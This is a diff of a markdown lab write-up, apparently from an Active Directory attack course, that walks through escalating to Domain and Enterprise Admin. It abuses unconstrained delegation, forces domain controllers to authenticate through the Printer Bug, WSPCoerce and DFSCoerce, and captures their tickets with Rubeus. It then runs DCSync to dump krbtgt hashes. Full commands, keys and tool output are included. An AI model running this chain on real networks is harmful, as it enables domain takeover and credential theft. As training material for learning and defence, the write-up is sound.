@@ -1,20 +1,32 @@
-# Learning Objective 15
+# Learning Objective 15 (Privilege Escalation | Unconstrained Delegation + Coercion + DCSync)
 
 ## Tasks
 
-1. **Find a server in the `dcorp` domain where Unconstrained Delegation is enabled**
-2. **Compromise the server and escalate to Domain Admin privileges**
-3. **Escalate to Enterprise Admins privileges by abusing Printer Bug**
+1. **Escalate to DA privileges abusing the unconstrained delegation using coercion and the DCSync attack**
+2. **Escalate to EA privileges abusing the unconstrained delegation using coercion and the DCSync attack**
+
+---
+
+## Attack Path Steps
+
+- **Find a Target Server where Unconstrained Delegation is Enabled**
+- **Access to the Target Server with a User that has Local Admin Privileges on it**
+- **Listen on the Target Server for an incoming TGT from the (Child) DC**
+- **Use Coercion to Force Authentication from the (Child) DC to a Service on the Target Server and Capture its TGT**
+- **Leverage the Captured TGT to Run a DCSync Attack on the (Child) DC and Gain DA Privileges**
+- **Listen on the Target Server for an incoming TGT from the (Parent Root) DC**
+- **Use Coercion to Force Authentication from the (Parent) DC to a Service on the Target Server and Capture its TGT**
+- **Leverage the Captured TGT to Run a DCSync Attack on the (Parent Root) DC and Gain EA Privileges**
 
 ---
 
 ## Solution
 
-1. **Find a server in the `dcorp` domain where Unconstrained Delegation is enabled**
+1. **Escalate to DA privileges abusing the unconstrained delegation using coercion and the DCSync attack**
 
-First, we need to find a server that has unconstrained delegation enabled.
+- **Find a Target Server where Unconstrained Delegation is Enabled**
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `cd \AD\Tools`
 
@@ -31,17 +43,17 @@ DCORP-DC
 DCORP-APPSRV📌
 ```
 
-Since **the prerequisite for elevation using Unconstrained Delegation is having admin access to the machine**, we need to compromise a user which has local admin access on `dcorp-appsrv`.
+- **Access to the Target Server with a User that has Local Admin Privileges on it**
+
+Since **the prerequisite for elevation using unconstrained delegation is having admin access to the machine**, we need to compromise a user which has local admin access on `dcorp-appsrv`.
 
 Recall that we extracted secrets of `appadmin`, `srvadmin` and `websvc` from `dcorp-adminsrv` (see *Learning Objective 07*).
 
-Let’s check if anyone of them have local admin privileges on `dcorp-appsrv`.
-
-First, we will try with `appadmin`. Run the below command **from an elevated command prompt**.
+Let's check if anyone of them have local admin privileges on `dcorp-appsrv`. First, we will try with `appadmin`.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -86,11 +98,9 @@ First, we will try with `appadmin`. Run the below command **from an elevated com
   ASREP (key)              :  68F08715061E4D0790E71B1245BF20B023D08822D2DF85BFF50A0E8136FFE4CB
 ```
 
-Run the below commands in the new spawned process.
-
 ![New spawned terminal process](./assets/screenshots/learning_objective_15_new_spawned_terminal_process.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `klist`:
 ```
@@ -122,17 +132,10 @@ Cached Tickets: (1)
 dcorp-appsrv📌
 dcorp-adminsrv
 ```
-🚩
 
-Sweet! We now have admin access to the machine that has Unconstrained Delegation.
+Sweet! We have admin access to the machine that has unconstrained delegation.
 
-2. **Compromise the server and escalate to Domain Admin privileges**
-
-**Execute Rubeus using Loader and winrs**
-
-Run the below command from the process running `appadmin`.
-
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `klist`:
 ```
@@ -161,8 +164,6 @@ C:\AD\Tools\Loader.exe
 1 File(s) copied
 ```
 
-Run Rubeus in listener mode in the winrs session on `dcorp-appsrv`.
-
 `winrs -r:dcorp-appsrv cmd`:
 ```
 Microsoft Windows [Version 10.0.20348.2762]
@@ -172,17 +173,9 @@ C:\Users\appadmin>
 ```
 🚀
 
-![Victim: dcorp-appsrv | appadmin](https://custom-icon-badges.demolab.com/badge/dcorp--appsrv-appadmin-64b5f6?logo=windows11&logoColor=white)
+- **Listen on the Target Server for an incoming TGT from the (Child) DC**
 
-`whoami`:
-```
-dcorp\appadmin
-```
-
-`hostname`:
-```
-dcorp-appsrv
-```
+![dcorp-appsrv | appadmin](https://custom-icon-badges.demolab.com/badge/dcorp--appsrv-appadmin-64b5f6?logo=windows11&logoColor=white)
 
 `ipconfig`:
 ```
@@ -202,22 +195,30 @@ Ethernet adapter Ethernet:
 
 ![HFS - Rubeus.exe](./assets/screenshots/learning_objective_15_hfs_rubeus.png)
 
+Run Rubeus in listener mode in the winrs session on `dcorp-appsrv`.
+
 `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap`:
 ```
-[*] Action: TGT Monitoring
-[*] Target user     : DCORP-DC$
+[*] Action: TGT Monitoring📌
+[*] Target user     : DCORP-DC$🖥️
 [*] Monitoring every 5 seconds for new TGTs
 
 [...]
 ```
 
-**Use the Printer Bug for Coercion**
+- **Use Coercion to Force Authentication from the (Child) DC to a Service on the Target Server and Capture its TGT**
 
-On the student VM, use MS-RPRN to force authentication from `dcorp-dc$`.
+Certain Microsoft services and protocols allow any authenticated user to force a machine to connect to a second machine.
+
+![Unconstrained Delegation - Coercion Protocols](./assets/screenshots/learning_objective_15_unconstrained_delegation_coercion_protocols.png)
+
+- **Coercion: Use the Printer Bug (MS-RPRN)**
+
+On the student VM, exploit the Printer Bug using Print System Remote Protocol (MS-RPRN) to force authentication from `dcorp-dc$`.
 
 The traffic on TCP port 445 from student VM to `dcorp-dc` and `dcorp-dc` to `dcorp-appsrv` is required.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`:
 ```
@@ -245,6 +246,8 @@ On the Rubeus listener, we can see the TGT of `dcorp-dc$`.
 
 Copy the base64 encoded ticket and use it with Rubeus on student VM.
 
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
 [SNIP]
@@ -256,7 +259,7 @@ Run the below command **from an elevated shell** as the SafetyKatz command that 
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args describe /ticket:C:\AD\Tools\dcorpdc-tgt.kirbi`:
 ```
@@ -315,6 +318,8 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
+- **Leverage the Captured TGT to Run a DCSync Attack on the (Child) DC and Gain DA Privileges**
+
 Now, we can run DCSync from this process.
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`:
@@ -341,7 +346,7 @@ Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
 Object Relative ID   : 502
 
 Credentials:
-  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986🧩
+  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986🔑
     ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
     lm  - 0: ea03581a1268674a828bde6ab09db837
 
@@ -359,13 +364,17 @@ Supplemental Credentials:
 
 [SNIP]
 ```
+🚩
 
-<🔄 Alternative Step🔄>
+<🔄 Alternative Step 🔄>
 
-**Use the Windows Search Protocol (MS-WSP) for Coercion**
+**Coercion: Use the Windows Search Protocol (MS-WSP)**
 
-We can also use Windows Search Protocol for abusing Unconstrained Delegation.
+We can also exploit Windows Search Protocol for abusing unconstrained delegation. We can use WSPCoerce.
+
 Please note that the **Windows Search Service is enabled by default on client machines but not on servers**. For the lab, we have configured it on the domain controller.
+
+Note that we are not using FQDN of `dcorp-dc` with WSPCoerce.
 
 The traffic on TCP port 445 from student VM to `dcorp-dc` and `dcorp-dc` to `dcorp-appsrv` is required.
 
@@ -373,7 +382,7 @@ Setup Rubeus in monitor mode exactly as we did for the Printer Bug.
 
 On the student VM, use the following command to force `dcorp-dc` to connect to `dcorp-appsrv`.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV`:
 ```
@@ -403,17 +412,17 @@ On the Rubeus listener, we can see the TGT of `dcorp-dc$`.
 [*] Ticket cache size: 1
 ```
 
-</🔄 Alternative Step🔄>
+**Coercion: Use the Distributed File System Namespaces Protocol (MS-DFSNM)**
 
-<🔄 Alternative Step🔄>
+If the target server has DFS Namespaces service running, we can exploit that too for coercion. We can use DFSCoerce.
 
-**Use the Distributed File System Protocol (MS-DFSNM) for Coercion**
+Note that we are not using FQDN of `dcorp-dc` with DFSCoerce.
 
-If the target has DFS Namespaces service running, we can use that too for coercion. The traffic on TCP port 445 from student VM to `dcorp-dc` and `dcorp-dc` to `dcorp-appsrv` is required.
+The traffic on TCP port 445 from student VM to `dcorp-dc` and `dcorp-dc` to `dcorp-appsrv` is required.
 
-Note that **this is detected by MDI**.
+**Note that this is detected by MDI.**
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv`:
 ```
@@ -440,15 +449,15 @@ On the Rubeus listener, we can see the TGT of `dcorp-dc$`.
 [*] Ticket cache size: 1
 ```
 
-</🔄 Alternative Step🔄>
+</🔄 Alternative Step 🔄>
 
-3. **Escalate to Enterprise Admins privileges by abusing Printer Bug**
+2. **Escalate to EA privileges abusing the unconstrained delegation using coercion and the DCSync attack**
 
-**Escalation to Enterprise Admins**
+- **Listen on the Target Server for an incoming TGT from the (Parent Root) DC**
 
-To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`. Run the below command to listen for `mcorp-dc$` tickets on `dcorp-appsrv`.
+To get EA privileges, we need to force authentication from `mcorp-dc`. Run the below command to listen for `mcorp-dc$` tickets on `dcorp-appsrv`.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `klist`:
 ```
@@ -477,41 +486,29 @@ C:\Users\appadmin>
 ```
 🚀
 
-![Victim: dcorp-appsrv | appadmin](https://custom-icon-badges.demolab.com/badge/dcorp--appsrv-appadmin-64b5f6?logo=windows11&logoColor=white)
+![dcorp-appsrv | appadmin](https://custom-icon-badges.demolab.com/badge/dcorp--appsrv-appadmin-64b5f6?logo=windows11&logoColor=white)
 
 `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap`:
 ```
 [*] Action: TGT Monitoring📌
-[*] Target user     : MCORP-DC$
+[*] Target user     : MCORP-DC$🖥️
 [*] Monitoring every 5 seconds for new TGTs
 
 [...]
 ```
 
+- **Use Coercion to Force Authentication from the (Parent) DC to a Service on the Target Server and Capture its TGT**
+ 
 Use MS-RPRN on the student VM to trigger authentication from `mcorp-dc` to `dcorp-appsrv`.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`:
 ```
 RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
 ```
 
-<🔄 Alternative Step🔄>
-
-Alternatively, we can also use MS-WSP or MS-DFSNM. Note that we are not using FQDN of `mcorp-dc` in case of WSPCoerce.
-
-`C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local`:
-```
-[SNIP]
-```
-
-`C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local`:
-```
-[SNIP]
-```
-
-</🔄 Alternative Step🔄>
+Alternatively, we can also use MS-WSP or MS-DFSNM.
 
 On the Rubeus listener, we can see the TGT of `mcorp-dc$`.
 
@@ -535,9 +532,11 @@ On the Rubeus listener, we can see the TGT of `mcorp-dc$`.
 As previously, copy the base64 encoded ticket and use it with Rubeus on student VM.
 Run the below command **from an elevated shell** as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process.
 
+- **Leverage the Captured TGT to Run a DCSync Attack on the (Parent Root) DC and Gain EA Privileges**
+
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…`:
 ```
@@ -591,7 +590,7 @@ Object Security ID   : S-1-5-21-335606122-960912869-3279953914-502
 Object Relative ID   : 502
 
 Credentials:
-  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf🧩
+  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf🔑
     ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
     lm  - 0: 87836055143ad5a507de2aaeb9000361
 
@@ -610,7 +609,7 @@ Supplemental Credentials:
 [SNIP]
 ```
 
-Awesome! We escalated to Enterprise Admins too!
+Awesome! We escalated to Enterprise Administrators too!
 🚩
 
 ---
